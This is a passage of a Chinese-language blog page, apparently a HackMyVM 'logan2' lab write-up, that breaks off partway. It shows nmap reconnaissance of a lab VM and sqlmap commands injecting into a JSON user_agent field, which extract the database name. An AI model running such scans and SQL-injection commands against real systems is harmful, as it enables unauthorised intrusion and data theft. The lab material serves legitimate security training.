@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# hmv_logan2
+
+# 0.简介
+
+**靶机**：[hackmyvm - logan2](https://hackmyvm.eu/machines/machine.php?vm=logan2)
+**难度**：黄色
+**目标 IP**：192.168.205.144
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.144
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:59 CST
+Nmap scan report for 192.168.205.144
+Host is up (0.00045s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
+3000/tcp open  http    Golang net/http server
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.95%I=7%D=1/20%Time=678E107B%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+SF:20Request')%r(GetRequest,1000,'HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
+SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
+SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=abfb225a6c69b259;
+SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=1KgRX_Fci-rGge6j5LIyElk
+SF:Aqp46MTczNzM2MzU3ODgyMTcyMjg4Mg;\x20Path=/;\x20Expires=Tue,\x2021\x20Ja
+SF:n\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEOR
+SF:IGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x20GMT\r\n\r\n<!
+SF:DOCTYPE\x20html>\n<html\x20lang=\'en-US\'\x20class=\'theme-\'>\n<head\x
+SF:20data-suburl=\'\'>\n\t<meta\x20charset=\'utf-8\'>\n\t<meta\x20name=\'v
+SF:iewport\'\x20content=\'width=device-width,\x20initial-scale=1\'>\n\t<me
+SF:ta\x20http-equiv=\'x-ua-compatible\'\x20content=\'ie=edge\'>\n\t<title>
+SF:\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20</title>\n\t<link
+SF:\x20rel=\'manifest\'\x20href=\'/manifest\.json\'\x20crossorigin=\'use-c
+SF:redentials\'>\n\t<meta\x20name=\'theme-color\'\x20content=\'#6cc644\'>\
+SF:n\t<meta\x20name=\'author\'\x20content=\'Gitea\x20-\x20Git\x20with\x20a
+SF:\x20cup\x20of\x20tea\'\x20/>\n\t<meta\x20name=\'description\'\x20conten
+SF:t=\'Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pai
+SF:nless')%r(Help,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
+SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
+SF:ad\x20Request')%r(HTTPOptions,1000,'HTTP/1\.0\x20404\x20Not\x20Found\r\
+SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en
+SF:-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=aa
+SF:35213287ba9b56;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=ibf5qw0V
+SF:W54yX8vVkKfbkR8gck06MTczNzM2MzU3ODgzNzkzMjYzOA;\x20Path=/;\x20Expires=T
+SF:ue,\x2021\x20Jan\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Opt
+SF:ions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x
+SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\'en-US\'\x20class=\'the
+SF:me-\'>\n<head\x20data-suburl=\'\'>\n\t<meta\x20charset=\'utf-8\'>\n\t<m
+SF:eta\x20name=\'viewport\'\x20content=\'width=device-width,\x20initial-sc
+SF:ale=1\'>\n\t<meta\x20http-equiv=\'x-ua-compatible\'\x20content=\'ie=edg
+SF:e\'>\n\t<title>Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x
+SF:20a\x20cup\x20of\x20tea\x20</title>\n\t<link\x20rel=\'manifest\'\x20hre
+SF:f=\'/manifest\.json\'\x20crossorigin=\'use-credentials\'>\n\t<meta\x20n
+SF:ame=\'theme-color\'\x20content=\'#6cc644\'>\n\t<meta\x20name=\'author\'
+SF:\x20content=\'Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\'\x20/
+SF:>\n\t<meta\x20name=\'description\'\x20content=\'Gitea\x20\(Git\x20with\
+SF:x20a\x20c');
+MAC Address: 08:00:27:B1:96:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.94 seconds
+
+```
+
+80、3000都是http服务
+
+# 2.踩点
+
+80是欢迎页，有一个脚本。">
+<meta property="og:title" content="hmv_logan2">
+<meta property="og:description" content="# hmv_logan2
+
+# 0.简介
+
+**靶机**：[hackmyvm - logan2](https://hackmyvm.eu/machines/machine.php?vm=logan2)
+**难度**：黄色
+**目标 IP**：192.168.205.144
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.144
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:59 CST
+Nmap scan report for 192.168.205.144
+Host is up (0.00045s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
+3000/tcp open  http    Golang net/http server
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.95%I=7%D=1/20%Time=678E107B%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+SF:20Request')%r(GetRequest,1000,'HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
+SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
+SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=abfb225a6c69b259;
+SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=1KgRX_Fci-rGge6j5LIyElk
+SF:Aqp46MTczNzM2MzU3ODgyMTcyMjg4Mg;\x20Path=/;\x20Expires=Tue,\x2021\x20Ja
+SF:n\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEOR
+SF:IGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x20GMT\r\n\r\n<!
+SF:DOCTYPE\x20html>\n<html\x20lang=\'en-US\'\x20class=\'theme-\'>\n<head\x
+SF:20data-suburl=\'\'>\n\t<meta\x20charset=\'utf-8\'>\n\t<meta\x20name=\'v
+SF:iewport\'\x20content=\'width=device-width,\x20initial-scale=1\'>\n\t<me
+SF:ta\x20http-equiv=\'x-ua-compatible\'\x20content=\'ie=edge\'>\n\t<title>
+SF:\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20</title>\n\t<link
+SF:\x20rel=\'manifest\'\x20href=\'/manifest\.json\'\x20crossorigin=\'use-c
+SF:redentials\'>\n\t<meta\x20name=\'theme-color\'\x20content=\'#6cc644\'>\
+SF:n\t<meta\x20name=\'author\'\x20content=\'Gitea\x20-\x20Git\x20with\x20a
+SF:\x20cup\x20of\x20tea\'\x20/>\n\t<meta\x20name=\'description\'\x20conten
+SF:t=\'Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pai
+SF:nless')%r(Help,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
+SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
+SF:ad\x20Request')%r(HTTPOptions,1000,'HTTP/1\.0\x20404\x20Not\x20Found\r\
+SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en
+SF:-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=aa
+SF:35213287ba9b56;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=ibf5qw0V
+SF:W54yX8vVkKfbkR8gck06MTczNzM2MzU3ODgzNzkzMjYzOA;\x20Path=/;\x20Expires=T
+SF:ue,\x2021\x20Jan\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Opt
+SF:ions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x
+SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\'en-US\'\x20class=\'the
+SF:me-\'>\n<head\x20data-suburl=\'\'>\n\t<meta\x20charset=\'utf-8\'>\n\t<m
+SF:eta\x20name=\'viewport\'\x20content=\'width=device-width,\x20initial-sc
+SF:ale=1\'>\n\t<meta\x20http-equiv=\'x-ua-compatible\'\x20content=\'ie=edg
+SF:e\'>\n\t<title>Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x
+SF:20a\x20cup\x20of\x20tea\x20</title>\n\t<link\x20rel=\'manifest\'\x20hre
+SF:f=\'/manifest\.json\'\x20crossorigin=\'use-credentials\'>\n\t<meta\x20n
+SF:ame=\'theme-color\'\x20content=\'#6cc644\'>\n\t<meta\x20name=\'author\'
+SF:\x20content=\'Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\'\x20/
+SF:>\n\t<meta\x20name=\'description\'\x20content=\'Gitea\x20\(Git\x20with\
+SF:x20a\x20c');
+MAC Address: 08:00:27:B1:96:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.94 seconds
+
+```
+
+80、3000都是http服务
+
+# 2.踩点
+
+80是欢迎页，有一个脚本。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_logan2.html">
+<meta property="og:image" content="https://github.githubassets.com/favicons/favicon.svg">
+<title>hmv_logan2</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hmv_logan2</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/27" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>hmv_logan2</h1>
+<h1>0.简介</h1>
+<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=logan2" rel="nofollow">hackmyvm - logan2</a><br>
+<strong>难度</strong>：黄色<br>
+<strong>目标 IP</strong>：192.168.205.144<br>
+<strong>本机 IP</strong>：192.168.205.141</p>
+<h1>1.扫描</h1>
+<p><code class="notranslate">nmap</code>起手</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.144
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:59 CST
+Nmap scan report for 192.168.205.144
+Host is up (0.00045s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
+3000/tcp open  http    Golang net/http server
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.95%I=7%D=1/20%Time=678E107B%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+SF:20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
+SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
+SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=abfb225a6c69b259;
+SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=1KgRX_Fci-rGge6j5LIyElk
+SF:Aqp46MTczNzM2MzU3ODgyMTcyMjg4Mg;\x20Path=/;\x20Expires=Tue,\x2021\x20Ja
+SF:n\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEOR
+SF:IGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x20GMT\r\n\r\n&lt;!
+SF:DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en-US\"\x20class=\"theme-\"&gt;\n&lt;head\x
+SF:20data-suburl=\"\"&gt;\n\t&lt;meta\x20charset=\"utf-8\"&gt;\n\t&lt;meta\x20name=\"v
+SF:iewport\"\x20content=\"width=device-width,\x20initial-scale=1\"&gt;\n\t&lt;me
+SF:ta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\"&gt;\n\t&lt;title&gt;
+SF:\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20&lt;/title&gt;\n\t&lt;link
+SF:\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorigin=\"use-c
+SF:redentials\"&gt;\n\t&lt;meta\x20name=\"theme-color\"\x20content=\"#6cc644\"&gt;\
+SF:n\t&lt;meta\x20name=\"author\"\x20content=\"Gitea\x20-\x20Git\x20with\x20a
+SF:\x20cup\x20of\x20tea\"\x20/&gt;\n\t&lt;meta\x20name=\"description\"\x20conten
+SF:t=\"Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pai
+SF:nless")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
+SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
+SF:ad\x20Request")%r(HTTPOptions,1000,"HTTP/1\.0\x20404\x20Not\x20Found\r\
+SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en
+SF:-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=aa
+SF:35213287ba9b56;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=ibf5qw0V
+SF:W54yX8vVkKfbkR8gck06MTczNzM2MzU3ODgzNzkzMjYzOA;\x20Path=/;\x20Expires=T
+SF:ue,\x2021\x20Jan\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Opt
+SF:ions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x
+SF:20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en-US\"\x20class=\"the
+SF:me-\"&gt;\n&lt;head\x20data-suburl=\"\"&gt;\n\t&lt;meta\x20charset=\"utf-8\"&gt;\n\t&lt;m
+SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
+SF:ale=1\"&gt;\n\t&lt;meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edg
+SF:e\"&gt;\n\t&lt;title&gt;Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x
+SF:20a\x20cup\x20of\x20tea\x20&lt;/title&gt;\n\t&lt;link\x20rel=\"manifest\"\x20hre
+SF:f=\"/manifest\.json\"\x20crossorigin=\"use-credentials\"&gt;\n\t&lt;meta\x20n
+SF:ame=\"theme-color\"\x20content=\"#6cc644\"&gt;\n\t&lt;meta\x20name=\"author\"
+SF:\x20content=\"Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\"\x20/
+SF:&gt;\n\t&lt;meta\x20name=\"description\"\x20content=\"Gitea\x20\(Git\x20with\
+SF:x20a\x20c");
+MAC Address: 08:00:27:B1:96:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.94 seconds
+
+</code></pre>
+<p>80、3000都是http服务</p>
+<h1>2.踩点</h1>
+<p>80是欢迎页，有一个脚本。3000是Gitea通常没洞，所以我们先看脚本</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">http://192.168.205.144/script.js
+
+document.addEventListener(<span class="pl-s"><span class="pl-pds">"</span>DOMContentLoaded<span class="pl-pds">"</span></span>, <span class="pl-en">function</span>() {
+    fetch(<span class="pl-s"><span class="pl-pds">'</span>/save-user-agent.php<span class="pl-pds">'</span></span>, {
+        method: <span class="pl-s"><span class="pl-pds">'</span>POST<span class="pl-pds">'</span></span>,
+        body: JSON.stringify({ user_agent: navigator.userAgent }),
+        headers: {
+            <span class="pl-s"><span class="pl-pds">'</span>Content-Type<span class="pl-pds">'</span></span>: <span class="pl-s"><span class="pl-pds">'</span>application/json<span class="pl-pds">'</span></span>
+        }
+    })
+    .then(response =<span class="pl-k">&gt;</span> {
+        <span class="pl-k">if</span> (response.ok) {
+            console.log(<span class="pl-s"><span class="pl-pds">'</span>User-Agent saved successfully.<span class="pl-pds">'</span></span>)<span class="pl-k">;</span>
+        } <span class="pl-k">else</span> {
+            console.error(<span class="pl-s"><span class="pl-pds">'</span>Error saving User-Agent.<span class="pl-pds">'</span></span>)<span class="pl-k">;</span>
+        }
+    })
+    .catch(error =<span class="pl-k">&gt;</span> {
+        console.error(<span class="pl-s"><span class="pl-pds">'</span>Network error:<span class="pl-pds">'</span></span>, error)<span class="pl-k">;</span>
+    })<span class="pl-k">;</span>
+})<span class="pl-k">;</span>
+</pre></div>
+<p>意思是它user_agent可以以json传点东西，开个burp试试</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7eda310a-cb6a-4253-bcfc-7d775b7c4564"><img src="https://github.com/user-attachments/assets/7eda310a-cb6a-4253-bcfc-7d775b7c4564" alt="Image" style="max-width: 100%;"></a></p>
+<p>sql注一下看有没有东西</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+└─$ sqlmap -r sql.txt --batch
+        ___
+       __H__                                                                                                                         
+ ___ ___[,]_____ ___ ___  {1.9#stable}                                                                                                 
+<span class="pl-k">|</span>_ -<span class="pl-k">|</span> <span class="pl-c1">.</span> [,]     <span class="pl-k">|</span> .<span class="pl-s"><span class="pl-pds">'</span>| . |                                                                                                            </span>
+<span class="pl-s">|___|_  [<span class="pl-pds">'</span></span>]_<span class="pl-k">|</span>_<span class="pl-k">|</span>_<span class="pl-k">|</span>__,<span class="pl-k">|</span>  _<span class="pl-k">|</span>                                                                                                            
+      <span class="pl-k">|</span>_<span class="pl-k">|</span>V...       <span class="pl-k">|</span>_<span class="pl-k">|</span>   https://sqlmap.org                                                                                         
+
+[<span class="pl-k">!</span>] legal disclaimer: Usage of sqlmap <span class="pl-k">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="pl-s"><span class="pl-pds">'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
+<span class="pl-s"></span>
+<span class="pl-s">[*] starting @ 17:10:23 /2025-01-20/</span>
+<span class="pl-s"></span>
+<span class="pl-s">[17:10:23] [INFO] parsing HTTP request from <span class="pl-pds">'</span></span>sql.txt<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">JSON-like data found in GET body. Do you want to process it? [Y/n/q] Y</span>
+<span class="pl-s">Cookie parameter <span class="pl-pds">'</span></span>_csrf<span class="pl-s"><span class="pl-pds">'</span> appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N</span>
+<span class="pl-s">[17:10:23] [INFO] testing connection to the target URL</span>
+<span class="pl-s">[17:10:23] [INFO] testing if the target URL content is stable</span>
+<span class="pl-s">[17:10:23] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels</span>
+<span class="pl-s">[17:10:23] [INFO] testing if (custom) POST parameter <span class="pl-pds">'</span></span>JSON-like user_agent<span class="pl-s"><span class="pl-pds">'</span> is dynamic</span>
+<span class="pl-s">[17:10:23] [WARNING] (custom) POST parameter <span class="pl-pds">'</span></span>JSON-like user_agent<span class="pl-s"><span class="pl-pds">'</span> does not appear to be dynamic</span>
+<span class="pl-s">[17:10:23] [WARNING] heuristic (basic) test shows that (custom) POST parameter <span class="pl-pds">'</span></span>JSON-like user_agent<span class="pl-s"><span class="pl-pds">'</span> might not be injectable</span>
+<span class="pl-s">[17:10:23] [INFO] testing for SQL injection on (custom) POST parameter <span class="pl-pds">'</span></span>JSON-like user_agent<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>AND boolean-based blind - WHERE or HAVING clause<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>Boolean-based blind - Parameter replace (original value)<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>MySQL <span class="pl-k">&gt;</span>= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>PostgreSQL AND error-based - WHERE or HAVING clause<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>Oracle AND error-based - WHERE or HAVING clause (XMLType)<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>Generic inline queries<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>PostgreSQL <span class="pl-k">&gt;</span> 8.1 stacked queries (comment)<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>Microsoft SQL Server/Sybase stacked queries (comment)<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>MySQL <span class="pl-k">&gt;</span>= 5.0.12 AND time-based blind (query SLEEP)<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>PostgreSQL <span class="pl-k">&gt;</span> 8.1 AND time-based blind<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>Microsoft SQL Server/Sybase time-based blind (IF)<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>Oracle AND time-based blind<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y</span>
+<span class="pl-s">[17:10:24] [INFO] testing <span class="pl-pds">'</span></span>Generic UNION query (NULL) - 1 to 10 columns<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[17:10:24] [WARNING] (custom) POST parameter <span class="pl-pds">'</span></span>JSON-like user_agent<span class="pl-s"><span class="pl-pds">'</span> does not seem to be injectable</span>
+<span class="pl-s">[17:10:24] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for <span class="pl-pds">'</span></span>--level<span class="pl-s"><span class="pl-pds">'</span>/<span class="pl-pds">'</span></span>--risk<span class="pl-s"><span class="pl-pds">'</span> options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option <span class="pl-pds">'</span></span>--tamper<span class="pl-s"><span class="pl-pds">'</span> (e.g. <span class="pl-pds">'</span></span>--tamper=space2comment<span class="pl-s"><span class="pl-pds">'</span>) and/or switch <span class="pl-pds">'</span></span>--random-agent<span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s"></span>
+<span class="pl-s">[*] ending @ 17:10:24 /2025-01-20/</span>
+<span class="pl-s"></span>
+<span class="pl-s"></span></pre></div>
+<p>不行，自己写一个试试</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data <span class="pl-s"><span class="pl-pds">'</span>{"user_agent":"1"}<span class="pl-pds">'</span></span> --batch --current-db 
+        ___
+       __H__                                                                                                                         
+ ___ ___[<span class="pl-s"><span class="pl-pds">'</span>]_____ ___ ___  {1.9#stable}                                                                                               </span>
+<span class="pl-s">|_ -| . [)]     | .<span class="pl-pds">'</span></span><span class="pl-k">|</span> <span class="pl-c1">.</span> <span class="pl-k">|</span>                                                                                                            
+<span class="pl-k">|</span>___<span class="pl-k">|</span>_  [(]_<span class="pl-k">|</span>_<span class="pl-k">|</span>_<span class="pl-k">|</span>__,<span class="pl-k">|</span>  _<span class="pl-k">|</span>                                                                                                            
+      <span class="pl-k">|</span>_<span class="pl-k">|</span>V...       <span class="pl-k">|</span>_<span class="pl-k">|</span>   https://sqlmap.org                                                                                         
+
+省略
+[17:17:19] [INFO] adjusting <span class="pl-k">time</span> delay to 1 second due to good response <span class="pl-c1">times</span>
+logan
+current database: <span class="pl-s"><span class="pl-pds">'</span>logan<span class="pl-pds">'</span></span>
+
+┌──(kali㉿kali)-[~/test/tmp]
